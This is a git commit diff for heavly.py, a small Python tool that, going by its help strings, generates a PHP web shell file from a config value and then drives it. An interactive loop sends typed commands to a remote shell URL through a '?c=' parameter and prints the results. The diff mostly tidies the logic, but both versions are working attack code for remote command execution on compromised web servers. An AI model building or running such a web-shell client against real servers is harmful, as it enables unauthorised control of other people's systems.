9b5a7687000c21f536565e9a690f8548ff23ebc7
Pedro-Souza <programadorhacker8@gmail.com>
2017-01-06 14:23:06 -0300

    update code.

--- heavly.py
+++ heavly.py
@@ -2,30 +2,31 @@ from argparse import ArgumentParser
 from configparser import ConfigParser
 from requests import get
 
-global args
+
+global arg
 parser = ArgumentParser()
-parser.add_argument("-u", dest="shell_url", action="store", help="Url de sua shell!")
-parser.add_argument("-g", dest="generate", action="store", help="Cria seu payload")
+parser.add_argument("-u", dest="shell_url", action="store",
+                    help="Url de sua shell!")
+parser.add_argument("-g", dest="generate", action="store",
+                    help="Cria seu payload")
 args = parser.parse_args()
 
-if args.shell_url == None and args.generate == None:
-    print(args)
-    exit(0)
-else:
-    if args.generate != None and args.shell_url == None:
-        shell_name = str(args.generate)
-        shell = shell_name+'.php'
-        opfile = open(shell,'+w')
-        config = ConfigParser()
-        config.read_file(open('config.ini'))
 
-        opfile.write(config['DEFAULT']['code'])
-        opfile.close()
-        print(shell+' is generated')
+if args.generate:
+    shell_name = str(args.generate)
+    shell = shell_name+'.php'
+    opfile = open(shell,'+w')
+    config = ConfigParser()
+    config.read_file(open('config.ini'))
 
-    if args.shell_url != None and args.generate == None:
-        url = str(args.shell_url)
-        while True:
-            cmd = str(input(">> "))
-            r = get(url+"?c={0}".format(cmd)).content
-            print(r)
+    opfile.write(config['DEFAULT']['code'])
+    opfile.close()
+    print(shell+' is generated')
+
+
+if args.shell_url:
+    url = str(args.shell_url)
+    while True:
+        cmd = str(input(">> "))
+        r = get(url+"?c={0}".format(cmd)).content
+        print(r)
